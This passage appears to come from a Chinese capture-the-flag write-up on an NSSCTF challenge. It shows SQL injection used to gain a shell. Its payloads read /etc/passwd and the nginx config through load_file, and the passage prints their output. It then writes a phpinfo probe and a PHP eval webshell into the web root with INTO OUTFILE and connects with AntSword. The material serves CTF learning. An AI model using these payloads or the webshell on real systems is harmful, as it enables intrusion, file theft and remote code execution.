知道网站根目录绝对路径<br> secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）<br> gpc关闭<br>原理：<br> 写入webshell，通过参数执行系统命令，结束后删除webshell<br>附：sqlserver getshell条件和原理<br> 条件：<br>  支持外连<br>  有sa权限<br> 原理：<br>  开启xp_cmd扩展执行系统命令  </p></blockquote><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><blockquote><p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;passwd’),2%23<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin<br>sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync<br>shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown<br>halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt<br>mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin<br>uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin<br>operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin<br>man:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin<br>postmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin<br>ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin<br>sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>at:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin<br>squid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin<br>xfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin<br>games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin<br>cyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin<br>vpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin<br>ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin<br>smmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin<br>guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin<br>www-data:x:82:82:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin<br>mysql:x:100:101:mysql:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;sbin&#x2F;nologin<br>nginx:x:101:102:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin</p></blockquote><h2 id="读取nginx配置文件，寻找网站根目录"><a href="#读取nginx配置文件，寻找网站根目录" class="headerlink" title="读取nginx配置文件，寻找网站根目录"></a>读取nginx配置文件，寻找网站根目录</h2><blockquote><p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;nginx&#x2F;nginx.conf’),2%23<br>Array ( [0] &#x3D;&gt; Array ( [username] &#x3D;&gt; daemon off; worker_processes auto; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn; events { worker_connections 1024; } http { include &#x2F;etc&#x2F;nginx&#x2F;mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root &#x2F;var&#x2F;www&#x2F;html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location &#x2F; { try_files $uri $uri&#x2F; &#x2F;index.php?$args; } location ~ .php$ { try_files $uri &#x3D;404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } [password] &#x3D;&gt; 2 ) )</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-title function_ invoke__">Array</span><br>        (<br>            [username] =&gt; daemon off;<br><br>worker_processes  auto;<br><br>error_log  /<span class="hljs-keyword">var</span>/log/nginx/error.log warn;<br><br>events &#123;<br>    worker_connections  <span class="hljs-number">1024</span>;<br>&#125;<br><br>http &#123;<br>    <span class="hljs-keyword">include</span>       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br>    sendfile        on;<br>    keepalive_timeout  <span class="hljs-number">65</span>;<br><br>    server &#123;<br>        listen       <span class="hljs-number">80</span>;<br>        server_name  localhost;<br>        root         /<span class="hljs-keyword">var</span>/www/html;<br>        index index.php;<br><br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br><br>        location / &#123;<br>            try_files <span class="hljs-variable">$uri</span>  <span class="hljs-variable">$uri</span>/ /index.php?<span class="hljs-variable">$args</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>            try_files <span class="hljs-variable">$uri</span> =<span class="hljs-number">404</span>;<br>            fastcgi_pass   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>;<br>            fastcgi_index  index.php;<br>            <span class="hljs-keyword">include</span>        fastcgi_params;<br>            fastcgi_param  SCRIPT_FILENAME  <span class="hljs-variable">$document</span>_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br>            [password] =&gt; <span class="hljs-number">2</span><br>        )<br><br>)<br></code></pre></td></tr></table></figure><h2 id="写入php探针"><a href="#写入php探针" class="headerlink" title="写入php探针:"></a>写入php探针:</h2><blockquote><p>?id&#x3D;-1)))))) union select ‘<?php phpinfo();?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’%23<br><a href="http://node6.anna.nssctf.cn:28413/info.php">http://node6.anna.nssctf.cn:28413/info.php</a></p></blockquote><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote><p>?id&#x3D;-1)))))) union select ‘<?php eval($_POST["cc"]);?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cc.php’%23<br>蚁剑连接：<a href="http://node6.anna.nssctf.cn:28413/cc.php">http://node6.anna.nssctf.cn:28413/cc.php</a> 密码cc</p></blockquote>]]></content>
     
     
     <categories>
